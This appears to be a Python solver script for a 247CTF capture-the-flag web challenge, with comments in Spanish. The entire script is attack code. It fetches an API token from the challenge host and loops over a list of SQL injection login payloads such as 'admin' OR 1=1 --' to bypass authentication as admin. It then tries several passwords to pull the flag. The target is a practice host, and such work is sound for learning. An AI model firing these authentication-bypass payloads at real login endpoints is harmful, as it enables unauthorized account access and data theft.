#!/usr/bin/env python3
import requests

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    return resp.json()["message"].split("reset to ")[1].rstrip("!")

def try_sql_login(username_payload, password, api_token):
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": username_payload, "password": password, "api": api_token},
        timeout=10)
    return resp.json()

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password},
        timeout=10)
    return resp.json()

api_token = get_token()

# SQL injection payloads para hacer login como admin
sql_payloads = [
    "admin' --",
    "admin'--",
    "admin' #",
    "admin'#",
    "admin' OR '1'='1' --",
    "admin' OR 1=1 --",
    "admin' OR username='admin' --",
    "admin' AND '1'='1",
]

for payload in sql_payloads:
    result = try_sql_login(payload, "anything", api_token)
    print(f"Payload: {payload}")
    print(f"  Result: {result}")
    
    if result.get("result") == "success" and "admin" in result.get("message", "").lower():
        # Intentar obtener la flag con cualquier password
        for test_pw in ["anything", "0"*32, "admin", api_token]:
            flag_result = get_flag(test_pw)
            print(f"  Flag attempt with '{test_pw}': {flag_result}")
            if "flag" in str(flag_result).lower() or "247CTF" in str(flag_result):
                print(flag_result.get("flag", flag_result))
                exit(0)
    print()
